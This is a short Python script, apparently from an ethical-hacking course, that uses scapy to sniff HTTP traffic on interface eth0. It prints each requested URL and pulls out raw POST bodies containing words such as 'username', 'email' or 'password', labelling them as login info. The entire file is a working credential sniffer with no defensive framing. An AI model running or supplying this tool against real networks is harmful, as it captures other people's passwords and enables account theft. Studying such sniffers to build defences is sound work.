#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


def sniff(interface, debug=False):
    scapy.sniff(iface=interface,
                store=True,  # whether to store results in memory
                prn=process_sniffed_packet)  # callback function


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        post = packet[scapy.Raw].load
        for keyword in ["username", "email", "login", "password", "pass", "user"]:
            if keyword in str(post):
                return post.decode('utf-8')


def get_url(packet):
    return packet[http.HTTPRequest].Host.decode('utf-8') + packet[http.HTTPRequest].Path.decode('utf-8')


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show())  # use for debug to display all HTTP request packets
        print(f"[+] URL: {get_url(packet)}")
        login_info = get_login_info(packet)
        if login_info:
            print(f"\n\n[+] Login info: {login_info}\n\n")


sniff(interface="eth0")
